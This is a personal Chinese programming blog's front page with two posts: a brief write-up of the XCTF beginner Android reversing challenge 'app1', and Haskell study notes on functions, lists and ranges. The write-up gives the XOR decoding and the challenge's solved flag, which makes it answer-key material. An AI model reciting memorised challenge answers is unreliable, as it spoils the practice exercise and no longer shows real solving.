<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="C++,pwn">










<meta name="description" content="C++/pwn/RE">
<meta property="og:type" content="website">
<meta property="og:title" content="vct的演算纸">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="vct的演算纸">
<meta property="og:description" content="C++/pwn/RE">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="vct的演算纸">
<meta name="twitter:description" content="C++/pwn/RE">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/">





  <title>vct的演算纸</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">vct的演算纸</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/17/XCTF攻防世界-Mobile-wp/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="purecall">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="vct的演算纸">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/17/XCTF攻防世界-Mobile-wp/" itemprop="url">XCTF攻防世界-Mobile_wp</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-17T19:56:27+08:00">
                2019-02-17
              </time>
            

            

            
          </span>

          

          
            
          

          
          
             <span id="/2019/02/17/XCTF攻防世界-Mobile-wp/" class="leancloud_visitors" data-flag-title="XCTF攻防世界-Mobile_wp">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="新手练习"><a href="#新手练习" class="headerlink" title="新手练习"></a>新手练习</h1><h2 id="app1"><a href="#app1" class="headerlink" title="app1"></a>app1</h2><p>JEB打开，但是点击变量不会像IDA一样跳转过去，只能慢慢找…</p>
<p><img src="/2019/02/17/XCTF攻防世界-Mobile-wp/1.png" alt="1"></p>
<p>解密代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc = <span class="string">"X&lt;cP[?PHNB&lt;P?aj"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = <span class="string">""</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line"><span class="meta">... </span>    flag.append(chr(ord(i)^<span class="number">15</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line"><span class="meta">... </span>    flag+=(chr(ord(i)^<span class="number">15</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag</span><br><span class="line"><span class="string">'W3l_T0_GAM3_0ne'</span></span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/03/haskell学习/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="purecall">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="vct的演算纸">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/03/haskell学习/" itemprop="url">haskell学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-03T22:43:27+08:00">
                2019-02-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          
             <span id="/2019/02/03/haskell学习/" class="leancloud_visitors" data-flag-title="haskell学习">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="sth"><a href="#sth" class="headerlink" title="sth."></a>sth.</h1><h2 id="装载调用"><a href="#装载调用" class="headerlink" title="装载调用"></a>装载调用</h2><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">doubleMe</span> x = x + x</span><br></pre></td></tr></table></figure>
<p>保存为<code>test.hs</code>，命令行中<code>:l test.hs</code></p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Prelude</span>&gt; :l test.hs </span><br><span class="line">[<span class="number">1</span> <span class="keyword">of</span> <span class="number">1</span>] <span class="type">Compiling</span> <span class="type">Main</span>             ( test.hs, interpreted )</span><br><span class="line"><span class="type">Ok</span>, modules loaded: <span class="type">Main</span>.</span><br><span class="line">*<span class="type">Main</span>&gt; doubleMe <span class="number">9</span></span><br><span class="line"><span class="number">18</span></span><br></pre></td></tr></table></figure>
<p>多个参数</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">doubleUs</span> x y = x*<span class="number">2</span> + y*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">*<span class="type">Main</span>&gt; doubleUs <span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure>
<h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><p>if强制要求有else，正因如此，if语句一定会返回某个值，所以if语句也是一个表达式</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">doubleSmallNumber</span> x = <span class="keyword">if</span> x &gt; <span class="number">100</span></span><br><span class="line">    <span class="keyword">then</span> x</span><br><span class="line">    <span class="keyword">else</span> x*<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="title">doubleSmallNumber'</span> x = (<span class="keyword">if</span> x &gt; <span class="number">100</span> <span class="keyword">then</span> x <span class="keyword">else</span> x*<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>所以把if语句置于一行会更好理解</p>
<p>其中<strong>单引号</strong>是函数命名的合法字符，可以用来区分一个稍经修改但差别不大的函数</p>
<h2 id="无参函数-定义"><a href="#无参函数-定义" class="headerlink" title="无参函数(定义)"></a>无参函数(定义)</h2><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">vct'purecall</span> = <span class="string">"no_para_func"</span></span><br><span class="line"></span><br><span class="line">*<span class="type">Main</span>&gt; vct'purecall</span><br><span class="line"><span class="string">"no_para_func"</span></span><br></pre></td></tr></table></figure>
<p><strong>首字母大写</strong>的函数是不允许的</p>
<p>没有参数的函数通常被称作<strong>定义</strong>，这里<code>vct&#39;purecall</code>就和字符串<code>no_para_func</code>等价，且它的值不可被修改</p>
<h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><blockquote>
<p>ghci中，可以用<strong>let</strong>关键字定义一个常量</p>
<p>ghci中执行<code>let a = 1</code>与脚本中的<code>a = 1</code>是等价的</p>
</blockquote>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; <span class="keyword">let</span> lostNumbers = [<span class="number">4</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">23</span>,<span class="number">48</span>]</span><br><span class="line">*<span class="type">Main</span>&gt; lostNumbers </span><br><span class="line">[<span class="number">4</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">23</span>,<span class="number">48</span>]</span><br><span class="line"></span><br><span class="line">*<span class="type">Main</span>&gt; ['a','b']</span><br><span class="line"><span class="string">"ab"</span></span><br></pre></td></tr></table></figure>
<p>List中不能同时出现字符和数字</p>
<p>字符串实际上就是一组字符的List，”test”实际上是[‘t’,’e’,’s’,’t’]的语法糖</p>
<p>通过<code>++</code>运算符可以合并List</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] ++ [<span class="number">5</span>]</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>]</span><br><span class="line">*<span class="type">Main</span>&gt; <span class="string">"hello"</span> ++ <span class="string">" "</span> ++ <span class="string">"world"</span></span><br><span class="line"><span class="string">"hello world"</span></span><br></pre></td></tr></table></figure>
<p>也可以用<code>:</code>运算符，<code>[1,2,3]</code> 实际上是<code>1:2:3:[]</code>的语法糖，表示一个空List从前端插入元素</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; '<span class="type">A'</span>:<span class="string">" SMALL CAT"</span></span><br><span class="line"><span class="string">"A SMALL CAT"</span></span><br><span class="line">*<span class="type">Main</span>&gt; <span class="number">4</span>:[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>]</span><br><span class="line">[<span class="number">4</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>]</span><br></pre></td></tr></table></figure>
<p>按照索引取得List中的元素，使用<code>!!</code>运算符</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; [<span class="number">3.1</span>,<span class="number">3.14</span>,<span class="number">3.1415</span>] !! <span class="number">1</span></span><br><span class="line"><span class="number">3.14</span></span><br><span class="line">*<span class="type">Main</span>&gt; <span class="string">"hello"</span> !! <span class="number">0</span></span><br><span class="line">'h'</span><br></pre></td></tr></table></figure>
<p>List作为List元素</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; <span class="keyword">let</span> b = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]]</span><br><span class="line">*<span class="type">Main</span>&gt; b</span><br><span class="line">[[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]]</span><br><span class="line">*<span class="type">Main</span>&gt; b ++ [[<span class="number">-1</span>,<span class="number">-2</span>]]</span><br><span class="line">[[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>],[<span class="number">-1</span>,<span class="number">-2</span>]]</span><br></pre></td></tr></table></figure>
<p><code>&gt; &gt;=</code>依次比较List元素的大小</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>]&gt;[<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>]</span><br><span class="line"><span class="type">True</span></span><br></pre></td></tr></table></figure>
<p><code>head</code>返回头部，<code>tail</code>返回尾部(除去头部的部分)，<code>last</code>返回最后一个元素，<code>init</code>返回除去最后一个元素的部分(为什么叫init…)，在使用这些时要特别注意<code>空List</code>，错误不会在编译期被捕获</p>
<blockquote>
<p>如果我们把List想象成一只怪兽，就是这个样子</p>
</blockquote>
<p><img src="/2019/02/03/haskell学习/1.png" alt="1"></p>
<p><code>length</code>返回长度，<code>null</code>检查是否为空，<code>reverse</code>反转，<code>take</code>返回一个List的前几个元素，<code>drop</code>从返回第x个元素开始的List</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; head [<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line"><span class="number">5</span></span><br><span class="line">*<span class="type">Main</span>&gt; tail [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">*<span class="type">Main</span>&gt; last [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"><span class="number">4</span></span><br><span class="line">*<span class="type">Main</span>&gt; init [<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">[<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">*<span class="type">Main</span>&gt; length ['z','x','v']</span><br><span class="line"><span class="number">3</span></span><br><span class="line">*<span class="type">Main</span>&gt; null [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="type">False</span></span><br><span class="line">*<span class="type">Main</span>&gt; null []</span><br><span class="line"><span class="type">True</span></span><br><span class="line">*<span class="type">Main</span>&gt; reverse ['t','e','m','p']</span><br><span class="line"><span class="string">"pmet"</span></span><br><span class="line">*<span class="type">Main</span>&gt; take <span class="number">3</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">*<span class="type">Main</span>&gt; take <span class="number">6</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">*<span class="type">Main</span>&gt; take <span class="number">0</span> [<span class="number">1</span>,<span class="number">5</span>]</span><br><span class="line">[]</span><br><span class="line">*<span class="type">Main</span>&gt; drop <span class="number">2</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">*<span class="type">Main</span>&gt; drop (<span class="number">-1</span>) [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">*<span class="type">Main</span>&gt; drop <span class="number">6</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">[]</span><br></pre></td></tr></table></figure>
<p><code>maximum</code>和<code>minimum</code>分别返回最大值和最小值，<code>sum</code>返回所有元素的和，<code>product</code>返回所有元素的乘积</p>
<p>elem判断元素是否包含于一个List，通常以<strong>中缀函数</strong>形式调用它</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; maximum [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="number">3</span></span><br><span class="line">*<span class="type">Main</span>&gt; minimum  [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="number">1</span></span><br><span class="line">*<span class="type">Main</span>&gt; sum [<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="number">12</span></span><br><span class="line">*<span class="type">Main</span>&gt; product  [<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="number">60</span></span><br><span class="line">*<span class="type">Main</span>&gt; elem <span class="number">4</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>]</span><br><span class="line"><span class="type">False</span></span><br><span class="line">*<span class="type">Main</span>&gt; <span class="number">4</span> `elem` [<span class="number">1</span>,<span class="number">4</span>]</span><br><span class="line"><span class="type">True</span></span><br></pre></td></tr></table></figure>
<h3 id="range"><a href="#range" class="headerlink" title="range"></a>range</h3><p><code>range</code>简单使用：</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Prelude</span>&gt; [<span class="number">1.</span><span class="number">.20</span>]</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>]</span><br><span class="line"><span class="type">Prelude</span>&gt; ['a'..'z']</span><br><span class="line"><span class="string">"abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line"><span class="type">Prelude</span>&gt; ['<span class="type">K'</span>..'<span class="type">Z'</span>]</span><br><span class="line"><span class="string">"KLMNOPQRSTUVWXYZ"</span></span><br></pre></td></tr></table></figure>
<p>还支持指定每一步该跨多远，比如，求1到20间的所有偶数或3的倍数</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Prelude</span>&gt; [<span class="number">2</span>,<span class="number">4.</span><span class="number">.20</span>]</span><br><span class="line">[<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">16</span>,<span class="number">18</span>,<span class="number">20</span>]</span><br><span class="line"><span class="type">Prelude</span>&gt; [<span class="number">3</span>,<span class="number">6.</span><span class="number">.20</span>]</span><br><span class="line">[<span class="number">3</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">15</span>,<span class="number">18</span>]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>不能通过[1,2,4..100]这样的语句来获得所有2的幂</p>
<p>[20..1]也是不行的，必须要[20,19..1]</p>
</blockquote>
<p>如果使用浮点数，由于定义原因，它并不精确</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Prelude</span>&gt; [<span class="number">0.1</span>,<span class="number">0.2</span>.<span class="number">.1</span>]</span><br><span class="line">[<span class="number">0.1</span>,<span class="number">0.2</span>,<span class="number">0.30000000000000004</span>,<span class="number">0.4000000000000001</span>,<span class="number">0.5000000000000001</span>,<span class="number">0.6000000000000001</span>,<span class="number">0.7000000000000001</span>,<span class="number">0.8</span>,<span class="number">0.9</span>,<span class="number">1.0</span>]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>应该尽量避免在range中使用浮点数</p>
</blockquote>
<p>也可以不标明range的上限，从而得到一个无限长度的List</p>
<p>考虑取前8个13的倍数：</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Prelude</span>&gt; [<span class="number">13</span>,<span class="number">26.</span><span class="number">.13</span>*<span class="number">8</span>]</span><br><span class="line">[<span class="number">13</span>,<span class="number">26</span>,<span class="number">39</span>,<span class="number">52</span>,<span class="number">65</span>,<span class="number">78</span>,<span class="number">91</span>,<span class="number">104</span>]</span><br><span class="line"><span class="type">Prelude</span>&gt; take <span class="number">8</span> [<span class="number">13</span>,<span class="number">26.</span>.]</span><br><span class="line">[<span class="number">13</span>,<span class="number">26</span>,<span class="number">39</span>,<span class="number">52</span>,<span class="number">65</span>,<span class="number">78</span>,<span class="number">91</span>,<span class="number">104</span>]</span><br></pre></td></tr></table></figure>
<p>后一种是更好的写法</p>
<blockquote>
<p>由于haskell是惰性的，它不会对无限长度的List求值</p>
<p>它会看你从它那去多少，在这里它看见你只要8个元素，便欣然交差</p>
</blockquote>
<p>如下是几个生成无限 List 的函数 <code>cycle</code> 接受一个 List 做参数并返回一个无限 List，划好范围</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Prelude</span>&gt; take <span class="number">10</span> (cycle [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line"><span class="type">Prelude</span>&gt; take <span class="number">7</span> (cycle <span class="string">"NULL "</span>)</span><br><span class="line"><span class="string">"NULL NU"</span></span><br><span class="line"><span class="type">Prelude</span>&gt; take <span class="number">15</span> (cycle <span class="string">"NULL "</span>)</span><br><span class="line"><span class="string">"NULL NULL NULL "</span></span><br></pre></td></tr></table></figure>
<p><code>repeat</code>接受一个值作参数，并返回一个仅包含该值的无限List，与用<code>cycle</code>处理单元素List差不多</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Prelude</span>&gt; take <span class="number">10</span> (repeat <span class="number">5</span>)</span><br><span class="line">[<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>]</span><br><span class="line"><span class="type">Prelude</span>&gt; take <span class="number">10</span> (repeat 'x')</span><br><span class="line"><span class="string">"xxxxxxxxxx"</span></span><br></pre></td></tr></table></figure>
<p>不过若只是想得到包含相同元素的List，用<code>replicate</code>会更简单</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Prelude</span>&gt; replicate <span class="number">3</span> <span class="number">10</span></span><br><span class="line">[<span class="number">10</span>,<span class="number">10</span>,<span class="number">10</span>]</span><br></pre></td></tr></table></figure>
<h2 id="List-Comprehension"><a href="#List-Comprehension" class="headerlink" title="List Comprehension"></a>List Comprehension</h2><p>数学中，<strong>集合(Set Comprehension)</strong> 概念中的<code>comprehension</code></p>
<p>通过它，可以从既有的集合中按照规则产生一个新的集合，</p>
<p>比如前十个偶数的集合可以表示为：</p>
<script type="math/tex; mode=display">
S = {2x | x∈N,x≤10}</script><p>竖线左边是输出函数，x是变量，N是输入集合</p>
<p>在haskell中，取前10个偶数</p>
